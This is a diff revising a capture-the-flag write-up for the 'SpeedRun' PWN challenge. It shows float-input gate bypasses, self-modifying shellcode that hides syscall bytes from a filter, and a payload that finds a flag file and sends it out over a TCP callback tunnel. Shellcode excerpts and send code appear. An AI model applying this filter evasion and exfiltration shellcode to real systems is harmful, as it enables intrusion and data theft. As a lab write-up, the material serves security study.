@@ -1,62 +1,35 @@
-# SpeedRun — NEXSEC 2026 CTF
+# SpeedRun (PWN): Write-up
 
-| Field | Details |
-| --- | --- |
-| Team | Eureka |
-| Category | PWN |
-| Points | 495 |
-| Service | `koala.nexsec.my:35028` |
-| Technique | Floating-point input gates, self-modifying shellcode, file discovery, TCP callback |
-| Status | Solved |
+**Flag:** `nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}`
 
-## Challenge
+The challenge asked us to “please solve it asap so i can sleep peacefully.” We had to answer two questions before the program would let us send shellcode. Getting through the questions was only the first part: the payload also had to avoid a banned instruction and send the flag back through a separate connection.
 
-> please solve it asap so i can sleep peacefully.
+### 1. Get past the two questions
 
-Connecting to the remote service presented two questions before the program would accept machine code:
+The service was running at `koala.nexsec.my:35028`. It first asked for a magic number, then asked for “THE magic number.”
 
-```text
-=== speedrun ===
-please solve it asap so i can sleep peacefully.
+The first answer was `nan`. That passed the first check in the recorded solve. We do not have the exact comparison reproduced here, so the confirmed part is the input that worked.
 
-turn 1/2: what's the magic number, buddy?
->
-turn 2/2: no. THE magic number.
->
-
-[+] gate passed. the floor is yours.
-send here, then up to 4096 bytes of code.
->
-```
-
-The objective was to get past these input checks, run code inside the challenge process, and obtain the flag. The challenge did not simply print the flag back to the original connection; the working approach used an outbound callback.
-
-## Getting through the two checks
-
-For the first prompt, the input `nan` worked. **The exact comparison in the challenge binary is not reproduced here**, so I am reporting the observed bypass rather than assuming its source-level implementation.
-
-The second input was the decimal floating-point value:
+The second answer was:
 
 ```text
 6.892987146013775e-42
 ```
 
-When parsed as an IEEE-754 single-precision float, this has the bit representation `0x00001337`. The decimal value looks arbitrary, but its 32-bit representation reveals the intended *magic number* (`0x1337`).
-
-The exploit script sends the two lines in order:
+This looks random until we treat it as a 32-bit float. Its underlying bits are `0x00001337`, which explains the magic-number hint.
 
 ```python
 s.sendall(b'nan\n')
-s.sendall((MAGIC_FLOAT + '\n').encode())
+s.sendall(b'6.892987146013775e-42\n')
 ```
 
-Once both prompts were satisfied, the service allowed a payload of at most **4096 bytes**.
+After those answers, the service allowed up to 4096 bytes of code.
 
-## Shellcode restriction and bypass
+### 2. Work around the banned syscall bytes
 
-The submitted machine code could not contain the literal x86-64 syscall bytes `0f 05`. The solution used **self-modifying shellcode**: assemble the payload with the two bytes `0f 04` in place of each syscall, then patch those bytes after the shellcode starts running.
+The payload could not contain `0f 05`, the x86-64 encoding of `syscall`. We still needed system calls to open the flag and send it back.
 
-A simplified excerpt from the submitted assembly shows the patching loop:
+The solution was to send `0f 04` at each syscall site, then change the second byte to `05` after the code started running. This kept the submitted bytes clear of the banned pattern.
 
 ```asm
 _start:
@@ -75,53 +48,49 @@ nextbyte:
     inc rbx
     jmp patch_syscalls
 patched:
-    ; syscall sites now contain 0f 05
+    ; continue with the patched syscall sites
 ```
 
-The Python generator checked the produced bytes before submission:
+Before sending the assembled code, the generator checked both restrictions:
 
 ```python
-if b'\x0f\x05' in code:
-    raise ValueError('banned opcode found in encoded shellcode')
-if len(code) > 4096:
-    raise ValueError('shellcode too long')
+assert b'\x0f\x05' not in code
+assert len(code) <= 4096
 ```
 
-This distinction is important: the transmitted payload avoids the forbidden byte pattern, but the code modifies itself at runtime so it can still execute Linux system calls.
+### 3. Find the flag file
 
-## Finding and extracting the flag
+We did not know the full filename, so the shellcode opened the current directory and used `getdents64` to read its entries. It looked for a name beginning with `flag-`.
 
-Rather than hard-code an unknown flag filename, the shellcode enumerated the current directory and looked for a filename starting with `flag-`.
-
-Its main actions were:
-
-1. Open the current directory (`.`) with `open`.
-2. Read directory entries via `getdents64` (syscall 217).
-3. Compare each directory-entry name against the `flag-` prefix.
-4. Open the matching file and read up to `0x300` bytes.
-5. Create a TCP socket, connect to the configured callback endpoint, and write the bytes to that socket.
-
-The relevant filename prefix check is a literal part of the exploit:
+The prefix check was:
 
 ```asm
 lea r8, [rbx+19]
-cmp dword ptr [r8], 0x67616c66  ; "flag" in little-endian order
+cmp dword ptr [r8], 0x67616c66  ; "flag", little-endian
 jne next_dirent
-cmp byte ptr [r8+4], 0x2d    ; '-'
+cmp byte ptr [r8+4], 0x2d      ; '-'
 jne next_dirent
 ```
 
-The exploit generated a `sockaddr_in` structure using the callback hostname/IP and port supplied to the Python script, embedding it into the resulting shellcode.
+Once it found a match, the payload opened the file and read up to `0x300` bytes.
 
-## Delivery and result
+### 4. Send the contents to a callback listener
 
-The exploit connected to the TCP service, sent the two answers, then sent a **16-bit little-endian length** followed by the payload bytes:
+The working payload sent the file through an outbound TCP connection. We used a Pinggy TCP tunnel to make the listener reachable from the challenge server.
+
+The public callback address and port were embedded in the shellcode before assembly. They must point to a live listener; an old tunnel address cannot be reused after it closes.
+
+The client then sent a 16-bit little-endian length followed by the shellcode:
 
 ```python
 s.sendall(struct.pack('<H', len(code)) + code)
 ```
 
-The recorded successful attempt used a **Pinggy TCP tunnel** as a publicly reachable callback destination. The shellcode was **314 bytes** long. After submission, the listening callback endpoint received the flag:
+The recovered client uses Python 3 and GNU Binutils (`as` and `objcopy`) to build the x86-64 payload, so Linux or WSL is suitable.
+
+### 5. Read the result
+
+The successful attempt used a 314-byte payload. The recorded output was:
 
 ```text
 [+] gate passed. the floor is yours.
@@ -131,32 +100,4 @@ The recorded successful attempt used a **Pinggy TCP tunnel** as a publicly reach
 FLAG: nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
 ```
 
-A functioning externally accessible TCP listener is required to receive the callback. The callback hostname or IPv4 address and port must be embedded in the shellcode before submission.
-
-## Step-by-step solution summary
-
-1. Connect to the service and answer the first prompt with `nan`. This is the observed bypass; the exact comparison in the binary has not been reproduced in this write-up.
-2. Answer the second prompt with `6.892987146013775e-42`, whose float32 representation is `0x1337`.
-3. Prepare the payload described above, encoding syscall sites as `0f 04` and patching them to `0f 05` at runtime.
-4. Supply an accessible TCP callback endpoint in the payload. The recorded solve used a Pinggy tunnel forwarding to a listening local TCP port.
-5. Send the 16-bit little-endian payload length followed by the shellcode.
-6. The payload discovers the `flag-` file, reads it, and returns its contents over the callback connection.
-7. Read the flag from the callback listener. The original connection is used to deliver the payload.
-
-## Supporting evidence and verification
-
-The transcript in **Delivery and result** is the recorded successful solve, including the gate-passed message, callback result, and flag. It is historical evidence rather than output from a new execution.
-
-The recovered solution code passed a Python syntax check. Offline assembly reproduced a **314-byte** payload for a test IPv4 callback endpoint, confirmed that the transmitted bytes contain no `0f 05` pattern, and checked the 4096-byte limit. Float32 conversion reproduced `0x00001337`.
-
-The documented client needs Python 3 and GNU Binutils (`as` and `objcopy`) with x86-64 support; Linux or WSL is suitable. An externally reachable listener is required for the callback. Current remote service availability has not been checked.
-
-## Flag
-
-```text
-nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
-```
-
-## Takeaway
-
-The interesting part of SpeedRun was not just recognizing `0x1337` in floating-point form. The final payload also needed to operate under a syscall-byte restriction and find a flag whose exact filename was unknown. Encoding syscall instructions until runtime, using `getdents64` for discovery, and returning the file over a TCP callback completed the chain.
+We also checked the recovered code offline: it assembled to 314 bytes for a test callback endpoint, contained no transmitted `0f 05` pattern, and stayed below the size limit. The float conversion also gave `0x1337`. These checks did not involve reconnecting to the challenge service.
